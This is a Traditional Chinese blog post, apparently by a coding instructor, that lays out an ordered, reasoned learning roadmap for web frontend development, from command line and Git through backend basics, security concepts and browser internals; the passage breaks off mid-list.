雖然說我一直很清楚自己目前偏好的學習方法以及路線，並且把我認為適合的路徑都變成上課的大綱拿去教學，但一來好像沒多少人會去看那個大綱，二來大綱並沒有詳細解釋背後的原因。因此我才覺得自己有必要寫這一篇，來寫一下自己認為比較「紮實」的網頁前端學習路線。 在開始之前有幾點必須先說明一下。 首先，此文章我預設的對象是毫無程式基礎的人。若你已經有了程式基礎，可以自行略過相關的單元。另外，對於毫無基礎又想轉職的人來說，這篇絕對不是「最快」轉職指南。 求快的話我相信文章裡提到的東西很多都不用學，畢竟現在有些工作的門檻低到我自己都嚇到了。但一心求快只會讓不穩的基礎更不穩。就算找到工作了，可是然後呢？就不再加強自己了嗎？就讓自己的實力停留在那邊嗎？ 若你想把這份工作做得長久，總有一天要面臨這些問題，那些以前沒學好的基礎，會在將來你困惑為什麼上不去時反噬你。每個人認為的「必備」以及對「紮實」的定義都不一樣，例如說有人會覺得只要把資工系教的那些科目修完就叫做紮實，其他都沒那麼重要。而這篇寫的是我自己認為紮實的路線。 這篇文章會告訴你「我認為」應該要學什麼，以及應該要照怎樣的順序學。最重要的是，我會附上理由。你可以自行判斷背後的理由是否合理，來決定是否要按照這個順序學。理由才是最重要的。 如果有時間，可以先參考這兩篇我以前寫過的文章： 當我們在學程式時，要學的到底是什麼？ There is no magic in my classroom 底下的學習路線基本上是從我之前的課綱改編而來，而且是秉持著上面這些原則在設計的。另外，下面比較多其實都是告訴你該學哪些工具，但請記住在學工具的時候，還必須去思考為什麼需要用到這些工具，它們解決了哪些問題。此篇文章只專注於網頁前端的領域，其餘工程師的基本功（例如說拆解問題或是定義問題範圍等等）不包含在裡面。 推薦資源的部分，原則上我只推薦自己嘗試過並且真的覺得很不錯的資源，所以並不是每個部分都會有。沒有的話可以自己透過 Google 尋找，學會找資料也是很重要的一環。 底下文章會很長，因為又要寫理由又要寫目標，我先附上學習路線： Command Line 的使用 Git 的使用 npm、Node.js 與 JavaScript 程式基礎 單元測試 Unit Testing 與 Jest 網路基礎概念 HTML 與 CSS JavaScript 與 DOM 以及事件機制 非同步與 AJAX 基礎後端 PHP 與 MySQL 資訊安全概念 學習後端框架 Express 後端部署 jQuery 與 Bootstrap CSS 預處理器 非同步歷程：callback、promise 與 async/await 深入理解 JavaScript 與瀏覽器相關機制 gulp 與 webpack 物件導向 React/Vue/Angular 三選一 接著底下就是每一點的詳細介紹。 1. Command Line 的使用 這是拉近你與電腦距離第一步，也是要開始學程式前最重要的基礎。 先大概講一下 Command line 是什麼，基本上就是你看電影時會看到電腦高手在一個黑底白字的視窗上打一堆指令（command），而第一步就是要學習怎麼使用這些基本指令。 我的 Terminal，有改過所以比較漂亮 學習理由 這一步之所以放最前面的原因有兩個，第一個是它讓你從以往的圖形使用者介面（Graphical User Interface，GUI）切換到命令列介面（Command Line Interface，CLI）。講白話一點，你以前要看桌面有什麼檔案，就用滑鼠點開檔案總管或是 Finder 就行了，你是靠著這些圖形介面去操作的。 但 Command line 之所以不同，是因為它是用文字去操作。就像我上面的截圖那樣，打一個神奇的指令 ls -al，就可以列出資料夾底下的所有檔案。 寫程式的本質跟使用 Command line 是一樣的： 利用指令與電腦溝通 第二個原因是它在程式開發裡非常重要。如果你是做設計相關的，電腦裡可能會有 PS、AI 或是 Sketch 等等的軟體，想用的時候只要滑鼠點兩下就可以了。但我們寫程式的不一樣，很多工具都沒有提供圖形介面，你只能使用指令（Command line）去操作它。 學習目標 只要學會常見指令（例如說 cd、ls、rm、mv 等等）即可。 2. Git 的使用 假設你有一個很喜歡改東西的主管，他請你幫忙畫一張圖。於是你畫好以後把圖片存成 v1.ai 並交給主管看，而主管說不行，要再改，就有了 v2.ai。後來主管說：「顏色改一下就差不多了」，你就把圖片改完以後存成 final.ai。 可誰知道主管看完以後又說要改，而且還要從 v2 開始改（這時你就會慶幸你有存起來），你只好打開 v2 的檔案，改完以後存成 v2–2.ai。 接下來的故事不用多說了，final.ai、real-final.ai、fucking-final.ai、real-real-final.ai，最後電腦出現了一大堆你也不知道哪個才是最終版的檔案，把自己搞得頭昏腦脹。 這是我自己放履歷的資料夾，我都不知道哪個才是最新的了… 版本控制是一件難事，尤其是透過這種傳統式的複製貼上，只會讓自己搞混。如果一個人搞混其實還行，頂多再花一點時間來找，但如果是一整個團隊協作一份文件，那問題就大了。 而軟體工程師就是一個逃不開團隊協作，也逃不開版本控制的一個行業。例如說目前版本是 v2 穩定版，於是小明繼續開發 v3 的新功能。可是某天 v2 卻被發現了一個 bug！負責救火的小華效率很高，不到一天就把 bug 修掉了。 可是問題來了，已經寫好的新功能不能發布，因為 v3 還沒開發完成，可是修好 bug 以後又要趕快讓使用者更新成新的版本，那怎麼辦呢？這就是需要版本控制的時候了。 講了這麼多，我只是想說明在寫程式上（尤其是多人協作時）版本控制的重要性，而最有名的一套協助你做版本控制的程式就叫做 Git。 學習理由 會放在第二個要學的東西，是因為先學了 Git 以後你就可以體驗幫自己以後寫的程式碼做版本控制。雖然說只有一個人的話，有些團隊協作才會碰到的困難會體驗不到，但沒關係，還是可以先從基礎的開始學。 學習目標 學習 Git 基本概念：什麼是 repository、什麼是 commit、什麼是 staged… 學會使用 add、commit、status、log 等基本指令 搞清楚 Git 與 GitHub 的差別並學會 push、pull、clone、fetch 學會使用 branch 與 checkout 如果要學 branch 的使用，誠心推薦 Learn Git Branching。 3. npm、Node.js 與 JavaScript 程式基礎 JavaScript 只是一個程式語言，目前主要可以跑在兩個環境上面，第一個環境眾所皆知，叫做瀏覽器，可以利用 JavaScript 去操作畫面；第二個環境叫做 Node.js，可以脫離瀏覽器獨立運作。你安裝好 Node.js 以後，輸入 node index.js 這個指令就可以在你電腦上執行 index.js 這個檔案。 這邊我希望大家先不要碰瀏覽器，而是在 Node.js 這個環境上執行自己的 JavaScript 程式碼。 因此這個階段就是要在自己的電腦上安裝 Node.js 環境，並且藉由 JavaScript 來學習程式語言的基礎（變數、判斷式、迴圈、函式等等）。推薦的學習資源是現代 JavaScript 教程。 那 npm 又是什麼呢？講到 npm 以前我們要先來講什麼是 library，在程式領域裡面不會翻叫圖書館，而是翻作「函式庫」，就是很多函式的集合啦。 簡單來說呢，有些功能不是很常用嗎？可能我會用到、你會用到、獨眼龍也會用到，那獨樂樂不如眾樂樂，與你分享的快樂勝過獨自擁有，我今天寫好一大堆常用的 function，可以給其他人用，皆大歡喜。這就叫做「我寫了一個 library 給別人用」。 npm 全名為 Node Package Manager，這邊的 package 就跟上面講的 library 差不多，中文翻作「套件」。是一個管理 Node.js 相關套件的服務，因此你可以發布自己寫好的套件到上面去，也可以透過 npm 安裝別人寫好的套件。 學習理由 有些人看到這邊可能會問說：「怎麼不是先學 HTML 與 CSS？」 我的理由是這樣的，既然是要走網頁前端，那就一定要學 JavaScript 這個程式語言，只是早學晚學的問題而已。而 HTML 與 CSS 能夠快速帶給學習者成就感，因為能夠立刻看見自己到底學了什麼，是能夠補充學習動力的科目。 在學新東西的時候，一定是剛開始最有毅力，之後就會慢慢消退，拖延症開始發作。選在這時候學 JavaScript 就是因為這樣。我覺得趁著動力還沒消退的時候先學比較好，後面才學 HTML 與 CSS，順便把動力一起補上。 而 npm 之所以重要，是因為你以後會很常用到 npm。在這個階段可以自己找一些簡單的套件來試用看看，順便練習看文件。 學習目標 想要測驗自己有沒有學好程式語言基礎的話，可以透過一些簡單的小題目來驗證，也可以寫一些 Codewar 的題目。只要裡面提到的那些基本的題目能寫得出來就 ok 了。 npm 的話只需要知道以下概念： 什麼是 package.json npm install 做了什麼事情 4. 單元測試 Unit Testing 與 Jest 上個階段有說可以寫一些小題目來測驗自己的程式基礎是否合格。在像是 Codewar 那種網站上面，它會幫你改，會告訴你錯在哪裡，可是在自己的電腦上要怎麼測呢？ 簡單嘛，就是自己想幾個測試案例，然後用 console.log 印出答案是不是對的。 感謝 https://carbon.now.sh 提供的服務 沒錯，這樣子是可以的，但其實這不是一個好方法。因為你必須要用肉眼去判斷到底是哪一個 test case 出了錯，若你的 test case 變多，也很難一時之間看出來到底答案是不是對的。 閃開！讓專業的來！（突然發現這句話也很有年代感了） Jest 是一套專門讓你測試 JavaScript 程式碼的框架，只要用它指定的架構及函式，就可以輕易寫出用來測試的檔案，而且還會有精美的測試報告。 而這種針對 function 的輸入以及輸出做測試的方式，我們稱之為單元測試（ Unit Testing）。測試寫得好，程式就不怕改壞掉。因為只要跑一下測試，就能看出程式碼寫得是否正確。 學習理由 會把單元測試放在這的理由是因為我覺得放這裡最貼切。上個階段會寫一堆小的 function，學了 Jest 之後剛好可以幫這些 function 加上單元測試，體驗看看測試的威力。 學習目標 知道如何使用 Jest 測試一個 function 的輸出入 盡力想出各種 test case 5. 網路基礎概念 在正式進入到網頁前端最有名的 HTML 與 CSS 之前，還有最後一件事情要做，那就是稍微知道一下網路的基礎概念。 在這階段你必須知道的東西包括但不限於： 什麼是前端？什麼是後端？ 什麼是 Request？什麼是 Response？ HTTP 是什麼？HTTP 的 method 又有哪些？ HTTP 的常見狀態碼（200、301、302、400、404、500…） 什麼是 API？ 理解這些概念以後，可以試著找一些現成的 API，然後使用 Node.js 的一些套件例如說 request 或是 axios 來嘗試串接看看。 沒有到很清楚沒關係，但基本的概念一定要有。因為一堆新手都對這方面幾乎毫無概念，導致發生問題時根本就找錯癥結點，花了很多時間才發現錯誤根本不是出在自己想像的地方。 這邊會推薦一些比較理論性的課，除了網路的概念以外也可以順便補齊其他基本概念： Crash Course [CS101] 初心者的計概與 coding 火球術 學習理由 會把這些網路概念放在這麼前面，是因為我在各個技術相關社團裡面看過太多太多搞錯領域的問題了。明明要問的是前端，卻在後端的社團發問，以為跟後端用的框架有關；明明是網路出了錯，卻以為是前端的問題。這些我都認為是沒有建立起整體網路的概念所導致的。 學習目標 知道什麼是 Request 跟 Response 知道什麼是 DNS 知道 localhost 跟 127.0.0.1 是什麼 知道什麼是 API 會使用 Node.js 寫出串接 API 的程式 知道 HTTP method 有哪些 知道基本的 HTTP status code，像是 200、301、400、404、500 6. HTML 與 CSS 前面鋪墊了這麼多，終於可以開始學 HTML 與 CSS 了。前者是網頁的骨架，後者是網頁的衣服。HTML 就只是用特定格式以及標籤組合而成的檔案，你必須選擇適合的標籤來表示內容，只要理解一些常見標籤就差不多了，而學習的重點有兩個。 第一個是要讓自己的 HTML 符合語意（semantic）。例如說你今天有一個列表，比起用一大堆 &lt;div&gt;，用 &lt;ul&gt; 跟 &lt;li&gt; 會更適合的多。該怎麼檢測呢？你不要看畫面，只看 HTML 原始碼的標籤，試看看能不能看出每個區塊代表的意思或是重要程度，如果可以的話，就代表你寫得不錯。 第二個是可以稍微關注一下 SEO（Search Engine Optimization），這其實跟上一點滿相關的。搜尋引擎會需要去爬很多網頁，並根據網頁的原始碼來解析。SEO 就是要讓它們能夠看懂你的網頁，知道你網頁上的重點是什麼。 舉例來說，假設現在有兩個網頁，第一個全部都只有 &lt;div&gt; 標籤，第二個有用 &lt;h1&gt; 把大標題寫出來。機器人看得懂哪一個？當然是第二個，因為 h1 就代表著大標題，它就會把裡面的內容視為是這個網頁的主題之一。 或是這樣說吧，標籤就像是寫文章的排版一樣，用得不好的沒有粗體、沒有標題甚至還沒有句號，一眼望去全部文字都長得一樣，分不出哪些是大標哪些是小標。用得好的標籤就是優質的排版，一目瞭然，有什麼都十分明瞭。 HTML 只能對網頁做基本的排版，需要進一步美化的話你需要 CSS。利用 CSS 你可以「針對網頁上不同地方」給予不同樣式，例如說 A 區塊背景是紅色，B 區塊背景是綠色等等。 這就帶出了 CSS 的第一個重點：我要怎麼選到我想選的地方？ 這叫做 CSS 選擇器（Selector），有一些規則要學，可以透過標籤、class、id 或更複雜的方式來選到想要的元素。學完一些基本的之後可以透過 CSS dinner 這個超可愛又好玩的遊戲來複習並加強對 selector 的理解。 再來就是跟排版相關的了，要知道什麼是 box model，知道 position 跟 display 所有屬性的差異，這都是排版很重要的東西。 為什麼它們重要？因為如果不理解以上機制的話，是沒辦法排版的。盒模型代表著瀏覽器怎麼去看每一個元素，而 display 決定了這些元素能不能排在同一行，position 可以讓你隨心所欲的放置元素。 另外，也必須知道如何使用 Flexbox 排版。可以透過好玩的 Flexbox Froggy 或是 Flex Pirate 來學習。如果有時間的話也可以看看比較新的屬性 grid，並且玩一下這個小遊戲：Grid Garden。 最後，也要知道該怎麼在不同螢幕尺寸上做不同的排版。 核心概念就是：「在不同尺寸上套用不同的 CSS」，例如說你原本是兩欄式排版，在使用手機觀看的時候就把這兩欄的寬度都設為 100%，就變成上下兩行的排版而不是並排了，這樣比較符合手機的使用習慣。 要做到這件事情需要透過 media queries 這個寫法，依照不同的條件（例如說螢幕寬度、高度等等）來載入不同的 CSS。 前面已經有講 CSS 學習時的重點了，但理論畢竟只是理論，你千萬不要想著看一看教學文就能夠理解那些理論到底想表達什麼。 我以前看了 position 的解釋千萬遍，卻從來都不理解 position: absolute 到底是根據誰定位，然後要拿來幹什麼。直到有一天我必須實作一個在圖片右上角放叉叉的功能，那時我才真的知道為什麼需要 absolute。 除了 CSS，其他東西也是這樣，光看是沒有用的。你看了 position 的解釋一百遍，還不如打開瀏覽器自己亂玩那些屬性一遍。 推薦的資源有： html &amp; css is hard Learn to Code HTML &amp; CSS MarkSheet HTML &amp; CSS : 網站設計建置優化之道（我學生推薦的） 學習理由 要開始學習前端的話，一定要會 HTML 與 CSS，因為這兩者是網頁的基礎。 學習目標 知道如何使用有語意的（semantic）標籤 知道基本的 CSS Selector 知道盒模型（box model ）是什麼，以及 padding、margin、border、width/height 與它的關係？ 知道 display 的幾種屬性：block、inline 與 inline-block 差別在哪裡 知道 position 的幾種屬性：static、relative、absolute、fixed 與 sticky 差別在哪裡 知道如何使用 Flexbox 來排版 知道如何使用 media queries 7. JavaScript 與 DOM 以及事件機制 還記得我前面說過 JavaScript 基本上可以跑在兩個地方嗎？瀏覽器與 Node.js。在學完 HTML 與 CSS 以後，就可以來試著把 JavaScript 寫在瀏覽器上面了。 寫在 Node.js 與瀏覽器上面最大的差別就是 你可以使用 JavaScript 操作畫面 只要是頁面上看得到的東西，你都可以改。你可以新增元素、刪除元素、更改樣式，也可以針對不同的元素加上不同的事件監聽器（Event listener）。舉例來說，你可以監聽某個按鈕的 click 事件，使用者點下按鈕的時候你就會知道，就可以針對這個事件做出反應，例如說點下按鈕之後跳出一個 alert 之類的。 這個部分的學習重點有兩個，第一個是 JavaScript 是如何操作畫面的？是透過一個叫做 DOM（Document Object Model）的東西。簡單來說就是瀏覽器把畫面上那些 HTML 元素都轉成物件，並且提供給你一個 API 來操作它們。 像是 document.querySelector(‘#aaa’)，會回傳 #aaa 這個 DOM 物件，你只要改變它，畫面上的元素也會跟著改變。所以學習的第一個重點就是如何操作 DOM 物件。你要學會怎麼新增、修改以及刪除這些物件。 第二個重點則會放在事件機制。 我要怎麼幫元素加上 event listener？又要怎麼拿掉？如果加上兩個會怎樣？ 除此之外，DOM 的事件機制比你想像的更複雜一點，例如說你有兩個重疊的元素，外面是藍色叫做 Blue，裡面是紅色叫做 Red： 事件傳遞機制附圖 今天當你點擊 Red 這個方框的時候，Red 的 click 事件就被觸發了。但不僅如此，接著 Blue 的 click 事件也被觸發了！想一想其實也滿合理的，因為 Red 是在 Blue 裡面，藍色的方框不是中空的，只是被紅色蓋過去而已。 這就是這個部分要學習的重點：事件機制的運作方式，細項可參考底下的學習目標。 這邊學完以後，你就能做出任何「不牽涉到網路」的應用程式了。例如說單機就可以玩的數獨小遊戲或者是五子棋，都可以做得出來，因為這些都只是畫面跟事件的集合而已。 舉例來說，五子棋怎麼做？ 先用 HTML 與 CSS 畫出棋盤 偵測棋盤的點擊事件，點下去時畫一個棋子在點擊的地方 判斷棋盤上的棋子是否連成一線 是，遊戲結束 否，換另一個玩家的回合，回到第二步 不要以為你只學了這些而已，這些就是精髓了。只要你可以監聽事件，可以更改畫面，有什麼功能是做不出來的？把想做的東西拆解到最後，會發現其實都只是這些操作的組合而已，沒有什麼魔法在裡面，你需要的只是一點想像力而已。 學習理由 如果要在瀏覽器上面學 JavaScript，那勢必要談到 DOM，才能操作畫面。 但前面我說過了，我不希望先講 HTML 與 CSS，我希望先講「程式語言 JavaScript」。這時候以 Node.js 環境來學習是比較好的方法，因為它不會牽涉到 DOM 或是其他前端的東西，它就只是個簡單的程式語言而已。 我認為這樣子能有兩個好處： 知道 JavaScript 不只能在瀏覽器上面跑 知道 JavaScript 只是個程式語言，DOM 是執行環境（瀏覽器）提供的東西，像是 Node.js 裡面就是沒有 DOM 的。 這樣才不會把執行環境跟 JavaScript 混為一談。 學習目標 知道 DOM 的基本操作，例如說插入、刪除、更改屬性等等 知道事件是如何傳遞的。知道什麼是捕獲，什麼又是冒泡。 知道 e.preventDefault 與 e.stopPropagation 的作用以及差別 知道 e.target 與 e.currentTarget 的差別 知道什麼是事件代理（Event delegation）以及適合用的場合 8. 非同步與 AJAX 在上一個部分學完事件機制的相關概念以後，就只差最後一塊拼圖了，那就是 JavaScript 與後端的溝通。我們會使用一種叫做 AJAX 的技術，聽起來很困難，但說穿了其實就是用瀏覽器提供的 Web API 向後端發送 Request 並且拿到 Response。 這個部份對於前端來說超級無敵重要，因為會有很多概念需要理解，我們一個一個來。 第一個是瀏覽器的同源政策（Same-Origin Policy）。 當你利用 JavaScript 發送 Request 的時候，出於安全性的考量瀏覽器會有一些限制。不同的 Request 限制也不太一樣，但大原則就是「如果後端沒有允許你做這件事，就拿不到 Response」。所以通常需要後端的協助，來開啟 CORS（Cross-Origin Resource Sharing，跨來源資源共享）。 你必須搞清楚什麼是同源政策、為什麼要有同源政策，而它又限制了哪些東西。也必須理解該怎麼利用 XMLHttpRequest 或是 Fetch 來串接 API。 第二個是既然提到了AJAX，你也必須知道非同步（Asynchronous）是什麼意思。這邊有些人會被字面上的意思誤導，因為同步（Synchronize）看起來很像「同時做一件事」。 可是在電腦科學的領域裡面，同步指的其實是「一次只能完成一件事，要等前面的事情做完，才會做下一件事」。如果與後端 API 串接是同步的，會發生什麼事？可怕了，如果後端速度很慢，10 秒後才會回傳 Response，那 JavaScript 必須等 10 秒才能執行下一個指令。 這不可能嘛，不可能讓整個畫面卡住 10 秒，所以 AJAX 的第一個 A 就代表著 Asynchronous，意思就是非同步地去跟 Server 溝通並交換資料。 那非同步要怎麼拿到資料？這邊就會講到回呼函式（Callback function）的概念。你準備好一個函式，並且跟瀏覽器說：「欸，你過來一下，等你好的時候記得叫我」。 除了 AJAX 以外，計時器（例如說 setTimeout）也是非同步的，你不可能原地等三秒之後執行嘛，一定在中途還有做其他事情，三秒後才會觸發計時器。可是眾所皆知，JavaScript 的執行是 single thread，一次只能做一件事，那到底是怎麼樣做到非同步的？ 這就會牽涉到 Event Loop 的機制，我強力推薦這個影片，講的超級好：What the heck is the event loop anyway? | Philip Roberts | JSConf EU。 學習理由 先來講一下為什麼建議這樣學，因為前面我們已經有了網路概念，也有了事件機制的概念，基礎的 JavaScript 都沒有問題了。而非同步的相關操作就是理解 JavaScript 的最後一塊拼圖，也是網頁前端很重要的一部分。 所以才會把 AJAX 放在這裡，等前面基礎打好以後再來接觸 AJAX，並且把非同步的相關概念一併理解。 學習目標 知道非同步與同步的差別 知道什麼是同源政策（Same-origin policy） 知道如何存取跨網域的資源（CORS） 知道如何使用 XMLHttpRequest 或 Fetch 串接 API 理解 Event loop 9. 基礎後端 PHP 與 MySQL 接著我們要來學習基礎的後端開發，會學純 PHP，也就是在不使用任何 PHP 的框架下來學習。 另一個重點是資料庫，這邊選用最常見的 MySQL，而且 PHP + MySQL 這個組合有一堆現成的工具可以用，例如說 XAMPP，直接幫你把整個環境建好。 MySQL 的部分不要跑去學什麼 ORM（Object Relational Mapping），請乖乖地寫 SQL Query，好好學一下怎麼樣做 CRUD（Create、Read、Update、Delete），並且自己試著開 Table 然後決定欄位的資料格式。 學習理由 看到這邊有些人可能會問：為什麼要學後端？ 來來來，有沒有注意到標題上的四個字？「網頁前端」，這同時代表著「網頁裡的前端」以及「網頁與前端」兩個意思。網頁分為前端跟後端，如果你只理解前端，你是永遠不可能理解整個網頁的。 就如同我在第五點網路基礎概念裡面提到的一樣，許多人都是缺乏了整體概念，才會導致出錯時定位錯問題，或是根本不知道問題發生在哪裡。學習後端最主要的理由就是補齊自己缺少的概念，當發生問題時你才知道問題到底出在哪裡。 這邊我不推薦學 Ruby on Rails，也不推薦 Laravel 跟 Express，而是推薦從 PHP 開始學——沒有使用任何框架的 PHP。 因為它夠簡單。一個 PHP 檔案就是負責一個頁面，你在檔案裡面 echo 什麼，畫面上就輸出什麼，十分簡單明瞭，而且很容易學。 若是你有學過一點程式或找過相關資料，可能會問說：「不對啊，可是這樣寫到後面 code 不會很髒嗎？全都混在一起，毫無架構可言！」 對啊，就是這樣，你說的很對——但我是故意的的。 如果全世界的生理男都長得像金城武，金城武還是帥的嗎？不是。金城武之所以帥，是因為你看過很多比他醜的人，你才知道金城武是帥的，這是比較而來的。 寫 code 也是同樣道理。你如果沒有寫過看過爛 code，你看到好 code 的時候怎麼知道它好在哪裡？你不會知道，而且你搞不好也認不出來那是好 code。你必須先寫過夠多爛 code，才會知道好 code 到底厲害在哪裡。 這就是為什麼我推薦從純 PHP 開始學，因為寫到後面你一定會寫得很髒很亂很難修改很難維護，但唯有這樣，接觸框架時才會知道框架到底好在哪裡。 學習目標 理解什麼是前端，什麼是後端 知道什麼是資料庫 了解基本的 SQL 語法，包括 Select、Insert Into、Delete 與 Update 能夠使用 PHP 做出簡單的留言板或是部落格 10. 資訊安全概念 學後端還有一個好處，那就是你會更清楚常見資訊安全漏洞到底是怎麼出現的，以及如何防禦。 如果你聽我的去學純 PHP 的話，你很有可能會寫出有 SQL Injection 或是 XSS（Cross-site Scripting 跨站式腳本攻擊）以及 CSRF（Cross-site request forgery 跨站請求偽造）漏洞的網站。 平常看再多文章，都不如自己的網站出漏洞來的有感。像我之前的興趣之一就是攻擊學生們自以為防禦的很好的網站，讓他們知道資訊安全的重要性。 常見的資安漏洞通常都是沒有預料到使用者的輸入會長得那麼千奇百怪。 例如說你有一個留言板開放人家留言，後端直接把留言內容印出來，你可能會想說沒什麼。直到某天有人留了 alert(1)，讓所有開啟留言板的人都彈出一個視窗，你才意識到：「靠腰勒，原來有人會輸入這麼奇怪的東西」。 學習理由 再重新講一下為什麼我建議不要從框架開始學的理由。若是你學了框架，你很有可能碰不到 SQL Injection 與 XSS，因為框架都幫你防掉了，你想入侵自己的網站都沒有辦法，就少了很多實測的樂趣。而且重點是哪天你一但脫離框架或者是錯誤地使用框架，很有可能產生出漏洞卻不自知，因為你沒有資訊安全的意識。 所以在這個部分，就是盡量讓自己寫出有漏洞的網站，然後自己試著入侵網站，看看是否能成功。成功以後就開始查詢修補方法，看看要怎麼補起來，這時候就會知道攻擊原理跟防禦手法，印象也會更深刻。 還有一個很重要的，密碼要記得 hash 過後才存到資料庫，拜託不要存明碼。 學習目標 知道雜湊與加密的差別 知道什麼是 SQL Injection 以及如何防範 知道什麼是 XSS 以及如何防範 知道什麼是 CSRF 以及如何防範 11. 學習後端框架 Express 前面已經受過純 PHP 的折磨了，寫過夠多爛 code，也寫出夠多漏洞了，接下來我才會推薦你開始學框架。要學哪一個都行，但我推薦 Express，因為它比較輕量，而且使用的程式語言是 JavaScript。 這個部分的目標很簡單，就是體驗看看有框架與之前沒框架的差別，熟悉後端框架中的幾個元素（MVC 之類的）與整體架構。 對於網頁前端工程師，學 Express 還有一個好處，那就是以後想要做什麼 side project 都可以自己來，後端可以自己寫。這是很多前端工程師的煩惱，想要做 side project 可是卻不會後端，資料不知道從哪裡去抓，因此只能放棄。 如果有時間也可以去學一套 ORM，例如說 Sequelize，你會覺得跟之前 SQL query 比起來快很多也簡單很多。 但是請千萬要記住，像 Express 這種框架或者是 Sequelize 這些 ORM，背後都沒有什麼魔法。拆到最底層一樣是你之前在 PHP 裡面學到的那些基礎，解析 Request、拿取參數、返回 Response 與執行 SQL query 等等。 學到框架以後就可以拋棄純 PHP 了，以後都可以用框架來開發。因為你是個知道框架在幹嘛，也知道為什麼要用框架的開發者，而不是只會用框架，卻連 SQL query 都不會寫的人。 學習理由 體驗有無框架的差別以及熟悉後端 MVC 架構，會更清楚有架構與沒有架構的差別。 學習目標 知道什麼是 MVC 知道什麼是 ORM 12. 後端部署 既然都已經開始學後端了，那就把後端的流程全部跑完吧！接下來要學的東西是部署，你必須自己去租一台機器（AWS、Google Cloud 第一年都有一些優惠，沒有優惠的 DigitalOcean 最便宜的機器一個月也才五塊美金），然後把程式碼放上去。 還需要自己去買一個網域（Domain），並且學習 DNS 的設定，把網域對應到你買的機器。完成之後，就能夠擁有一個個人網站了，以後的作品集都可以放在自己的網站上。 學習理由 這是學習路線裡面最後一個有關後端的部分了，之後的內容都不會再有後端。你可能會想說身為網頁前端工程師，有必要學這麼多後端嗎？ 你錯了，這些一點都不多，我覺得只是皮毛而已。後端的水一樣很深，我們學到的真的只是一些基礎，而這些後端概念是我認為許多前端工程師所欠缺的。 如同我前面說的一樣，網頁是由前端與後端組成，少了任何一邊都不夠完整。要你學這些後端不是為了讓你成為後端工程師，而是讓你在網頁出問題時能夠明確知道問題發生在哪裡。 學習目標 知道如何設定網域（A、CNAME） 知道如何用 SSH 遠端連線到自己的主機 知道怎麼部署自己寫好的程式 中場總結 以上的東西全部學完以後，我覺得基礎就算 ok 了。以學到的東西來說，已經可以把任何看得到的網站實作出來。真心不騙，只是功能可能陽春一點，速度慢一點，但真的做得出來。 任何網站都是由底下這些基礎組合而成，括弧裡面是學到的對應的技術： 後端伺服器與商業邏輯（PHP + Apache） 資料庫（MySQL） 前端頁面與互動（HTML + CSS + JavaScript） 圖片來源：https://tw.beanfun.com/kartrider/img_newhand/s01.jpg 不知道大家有沒有玩過跑跑卡丁車？反正就是一個賽車遊戲。現在的情況就是，你已經學會開車、學會甩尾以及單噴，也學了常見地圖的跑法，一定可以跑到終點，只是時間快慢而已。 所以接下來要學的東西都只有一個目的： 讓你跑得更快 13. jQuery 與 Bootstrap 在前面的段落裡與前端相關的部分幾乎沒有提到任何一個 library，而接下來的推薦學習路線會出現許多的 library 以及工具。 第一個是鼎鼎大名的 jQuery。不用學到多厲害，基本的東西會用就好。我覺得 jQuery 還是挺好用的，而且是前端發展史上面非常重要的一環。 再來是 Bootstrap，只想入門的話我也覺得不難學，就按照官方文件把元件的 CSS 加上 class 就差不多了。總之它是個 UI library，可以幫助你把畫面變得更漂亮也更有一致性。 前面有說過基礎已經學的差不多了，接下來的內容都會專注在「如何跑得更快」，而這兩個 library 我認為就有符合這個條件，藉由 jQuery 以及 Bootstrap 來提升自己的開發速度。 學習理由 學 jQuery 的理由是儘管它現在沒有那麼熱門了，但在小專案上面依然很好用，而且透過 jQuery 可以幫你減少一些原生很煩瑣的操作，節省時間。然後只是想要入門 jQuery 的話我覺得不用花多久時間，所以學一下比較好。 Bootstrap 的話則是能夠美化你的介面並且加速排版。 除了學新的工具以外，同時也是在訓練自己看文件的能力。今天你想要用 jQuery 來做 AJAX，應該要用哪個函式？想要套用 Bootstrap 的按鈕，class 應該怎麼用？這些都要透過 Google 或者是去官方文件查詢才會知道。看文件也是工程師的必備能力之一。 學習目標 我覺得可以用這兩個東西寫出一個 TodoList 就沒問題了。 14. CSS 預處理器 「跑得更快」的方法之一就是站在巨人的肩膀上，用著前輩們開發出來的好用工具，就能讓開發的速度更快，程式碼也更好維護。 而 CSS 預處理器就是這樣子的一個東西，可以讓你用像寫程式那樣子的方法來寫 CSS，可以定義變數、跑迴圈，甚至是呼叫函式。 知名的預處理器有 SaSS/SCSS、Less 以及 Stylus 等等，這裡面隨便挑一套來學就好。會需要學這個是因為現在很少人直接寫 CSS 了，都是用 CSS 預處理器來編譯。 學習理由 幫助你寫出更好維護的 CSS，同時也提高開發效率。 學習目標 了解 CSS 預處理器的目的以及原理 能夠把自己之前寫的 CSS 用任一預處理器改寫 15. 非同步歷程：callback、promise 與 async/await 在第八點「非同步與 AJAX」裡面就有學到了 Callback 的概念。由這個延伸出去可以學到 Promise，以及比較新的 async/await 語法，這些都與非同步的概念息息相關。 學習理由 在 JavaScript 裡面，理解這些東西的使用以及發展歷程我覺得是滿重要的事情，因此特地給這個主題一個段落，畢竟這些東西應該要是放在一起學習的。 要學的理由是 JavaScript 裡許多東西是非同步的，而現在幾乎都會用 Promise 來處理非同步的問題，要理解這些語法才能知道如何使用。 學習目標 知道如何使用 Promise 知道如何使用 .then 及 .catch 知道如何「同時」執行多個 Promise 知道如何「按照順序」執行多個 Promise 知道如何使用 async/await 16. 深入理解 JavaScript 與瀏覽器相關機制 在前面我們學了比較多的工具，使我們可以利用它們打造出自己的產品。但除了工具以外，背後的原理也是很重要的。學習原理以及一些比較底層的概念，會讓你對這些技術更有信心，在發生問題時你能想到的地方也更多。 舉例來說，有時候碰到的問題可能跟 JavaScript 本身沒有關係，而是瀏覽器的運行機制導致這樣的結果。如果完全都不知道瀏覽器做了什麼，那可能會一直糾結在「問題一定出在這邊！」，但事實上根本不是。 這邊推薦的學習資源是 How Browsers Work: Behind the scenes of modern web browsers，裡面可以看到現代瀏覽器的執行方式。 還有 Chrome 滿 20 歲時所推出的 Inside look at modern web browser 系列，都能夠大大增進你對於瀏覽器的理解。如果英文不好，上面這些文章都可以找到非官方的中文翻譯版本。 最後也推薦一堂 Google 在 Udacity 上開的課：Website Performance Optimization，裡面會提到瀏覽器解析 HTML 的過程以及載入資源的順序等等。 至於 JavaScript 的部分可以從一些常見的問題下手，例如說 closure、scope、this、hoisting 等等，都是常見的關鍵字。 這邊推薦俗擱大碗的 JavaScript: Understanding the Weird Parts，也推薦 You Don’t Know JS 以及我自己之前寫的五篇相關文章： 該來理解 JavaScript 的原型鍊了 深入探討 JavaScript 